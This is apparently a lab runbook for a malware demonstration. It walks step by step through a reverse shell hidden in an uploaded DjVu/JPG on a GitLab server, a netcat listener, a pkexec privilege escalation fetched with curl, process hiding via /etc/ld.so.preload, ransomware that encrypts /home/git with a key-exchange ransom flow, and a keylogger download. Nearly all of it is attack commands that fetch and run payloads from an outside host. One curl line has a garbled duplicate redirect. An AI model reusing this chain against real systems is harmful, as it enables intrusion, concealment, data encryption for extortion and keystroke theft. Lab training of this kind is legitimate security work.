
Start Malware gitlab server VM

Start and Login to Malware Lab VM using my user

Reverse-shell
=============
Connect to gitlab server using browser: badguy/Badguy12345
Go to project test-project. Go to directory images
upload client reverse shell to gitlab (AA_TOUCH_ME_NOT_TREX)
upload iamgroot (privilege escalation with pkexec)
upload libhideclient.so (process hideclient reverse shell)
upload ransomware binary
upload keygrabber binary

in attacker VM:
open new terminal window and start reverse shell server
cd Malware/Project/reverse-shell
sudo python3 reverse-shell-server.py

upload client reverse shell DjVu image: AA_TOUCH_ME_NOT_TREX.jpg
reverse shell windows should receive victim shell prompt

Revere-shell workaround
=======================
open new terminal window
execute "sudo nc -lnvp 80"

upload port80.jpg

Privilege Escalation
====================
download privilege escalation:
curl http://192.168.222.132/badguy/test-project/-/raw/master/images/iamgroot>/tmp/iamgroot>/tmp/iamgroot
chmod +x /tmp/iamgroot
invoke privilege escalation: cd /tmp;/tmp/iamgroot

process hiding
download libhideclient.so to /usr/local/lib
curl http://192.168.222.132/badguy/test-project/-/raw/master/images/libhideclient.so>/usr/local/lib/libhideclient.so
chmod +x /usr/local/lib/libhideclient.so

in victim server
execution of client AA_TOUCH_ME_NOT_TREX
do : ps -ef|grep "00 /tmp/AA_TOUCH_ME_NOT_TREX"

en tn window
echo "/usr/local/lib/libhideclient.so">/etc/ld.so.preload

in victim server
execution of client AA_TOUCH_ME_NOT_TREX
do : ps -ef|grep ^/tmp/AA_TOUCH_ME_NOT_TREX$

reverse shell process hidden

Do Ransomware exploit:
======================
download Ransomware, public.pem and UFF to /root
curl http://192.168.222.132/badguy/test-project/-/raw/master/images/RansomWare>RansomWare
curl http://192.168.222.132/badguy/test-project/-/raw/master/images/UFF>UFF
curl http://192.168.222.132/badguy/test-project/-/raw/master/images/public.pem>public.pem
chmod +x RansomWare
chmod +x UFF

execute Ransomware outside git: /root
./RansomWare
encrypted directory: /home/git
 this generates txt
 send email (gmail to self) EMAIL.txt
 
in attacker VM, copy EMAIL.txt to ransomware folder
 python3 decr*
 run decrypt in attacker VM using EMAIL.txt
generates a KEY.txt and send back by email to victim
 send txt from decrypt via email to victim and store in /home/git
 run UFF


Keylogger
=========

curl http://192.168.222.132/badguy/test-project/-/raw/master/images/klscriptsh>/tmp/klscript.sh
chmod +x /tmp/klscript.sh



